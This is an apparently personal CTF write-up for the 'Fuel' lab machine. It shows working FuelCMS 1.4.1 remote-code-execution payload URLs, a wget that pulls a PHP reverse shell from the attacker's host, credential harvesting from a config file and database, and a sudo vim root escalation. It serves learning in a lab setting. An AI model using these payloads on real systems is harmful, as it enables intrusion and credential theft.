---
layout: default
title : muzec - zSeucurity Fuel Writeup
---

![image](https://user-images.githubusercontent.com/69868171/117584595-d56dc780-b0db-11eb-802c-b0ad07d21178.png)


We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 12:33 EDT
Nmap scan report for 10.10.176.69
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1c:59:d1:07:ea:d8:d2:0d:9a:1a:95:0c:74:f2:e6:d0 (RSA)
|   256 cd:a8:fc:b3:5c:0e:3e:12:76:80:d3:60:cb:1f:88:50 (ECDSA)
|_  256 91:57:e4:6e:1d:4e:48:ec:3a:1c:a3:c7:89:40:4b:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Fuel CTF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.27 seconds
```

Shit here we go again lol so we have 2 open ports SSH(22) and HTTP(80) ok aheading to port 80 to see what is running.

![image](https://user-images.githubusercontent.com/69868171/117584720-7c526380-b0dc-11eb-9d0a-123f174ce218.png)

![image](https://user-images.githubusercontent.com/69868171/117584742-8ffdca00-b0dc-11eb-99e1-c1e45d11066a.png)

Fuelcms cool and we have the version also 1.4.1 ok let look around the blog more so i found a credentials aslo but no luck with it.

![image](https://user-images.githubusercontent.com/69868171/117584787-dce1a080-b0dc-11eb-9e2b-7d5790f70670.png)

Since we know the Fuelcms version let check if it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/117584839-30ec8500-b0dd-11eb-8c87-46008b61577f.png)

Ahhhh yea some Remote Code Execution exploit look cool let give it a try i love doing things manually why is that?? because we learn more from doing things manually that is the best way to learn.

![image](https://user-images.githubusercontent.com/69868171/117585011-2ed6f600-b0de-11eb-9878-2c13781881d8.png)

Going through the exploit i found our the vulnerable page which can allow us to run system command with some little tweaking added.

`http://10.10.176.69/fuelcms/index.php/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('uname -a')%2B'`

![image](https://user-images.githubusercontent.com/69868171/117585104-99883180-b0de-11eb-86a2-798f082937dc.png)

Cool our commands works now time to get a reverse shell back to our terminal.

1. we need to host the reverse shell with SimpleHTTPServer on our attacking machine
2. we need to use wget to get it onto the victim machine

![image](https://user-images.githubusercontent.com/69868171/117585218-3a76ec80-b0df-11eb-84f8-a30807d79e6a.png)

Now let wget it.

`http://10.10.176.69/fuelcms/index.php//fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('wget local-ip:8000/rev.php')%2B'`

![image](https://user-images.githubusercontent.com/69868171/117585275-845fd280-b0df-11eb-9de0-3297ad86327d.png)

Now let start our ncat listener with the port we add to the reverse shell file.

![image](https://user-images.githubusercontent.com/69868171/117585322-cee14f00-b0df-11eb-9123-14835a5f5ec7.png)

Now let access the reverse shell file to get our shell back we can also confirm our file if upload on the target.

`http://10.10.176.69/fuelcms/index.php//fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('ls -la')%2B'`

![image](https://user-images.githubusercontent.com/69868171/117585370-1a93f880-b0e0-11eb-9a1a-7be8eace4fa9.png)


Now let get Shell.

`http://10.10.176.69/fuelcms/rev.php`

![image](https://user-images.githubusercontent.com/69868171/117585453-7cecf900-b0e0-11eb-8f63-005ea3d754dd.png)

Boom we have shell and also let spawn a TTY shell.

`python3 -c 'import pty; pty.spawn ("/bin/bash")'`

### Privilege Escalation

Going to the directory we have only one user both have no access to it.

![image](https://user-images.githubusercontent.com/69868171/117585620-6004f580-b0e1-11eb-87bf-b4505aeb95b4.png)

Going through the FuelCMS folder i found the database with MYSQL login details.

`/var/www/html/fuelcms/fuel/application/config/database.php`

![image](https://user-images.githubusercontent.com/69868171/117585760-1c5ebb80-b0e2-11eb-8623-80d84ef75cdb.png)

Typing `mysql` and i was in .

![image](https://user-images.githubusercontent.com/69868171/117585807-6e9fdc80-b0e2-11eb-8cde-2973b2fe363d.png)

```
show databases;
use fuelcmsdb;
show tables;
```

![image](https://user-images.githubusercontent.com/69868171/117585865-ba528600-b0e2-11eb-855e-25a431b1ccf4.png)

Now let read fuel_users table.

`SELECT * From fuel_users;`

![image](https://user-images.githubusercontent.com/69868171/117585909-09002000-b0e3-11eb-9ac7-1a1598699d3f.png)

Boom we have john password in base64 now let decode it.

![image](https://user-images.githubusercontent.com/69868171/117585926-3056ed00-b0e3-11eb-8e5f-5a0258df2e86.png)

Decoded since we have the password now i think we have port 22 open which is SSH let log in with it.

![image](https://user-images.githubusercontent.com/69868171/117585996-82980e00-b0e3-11eb-903b-45bd6f5a67f9.png)

And we are in now let check sudo.

![image](https://user-images.githubusercontent.com/69868171/117586007-96dc0b00-b0e3-11eb-8c64-756bf7be0c54.png)

Seems we can run vim ti get root let check gtfobins.

![image](https://user-images.githubusercontent.com/69868171/117586064-d4d92f00-b0e3-11eb-842f-28ebc75eefef.png)

`sudo vim -c ':!/bin/sh'`

![image](https://user-images.githubusercontent.com/69868171/117586106-03570a00-b0e4-11eb-8c25-19956db04ef7.png)

And we are root.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
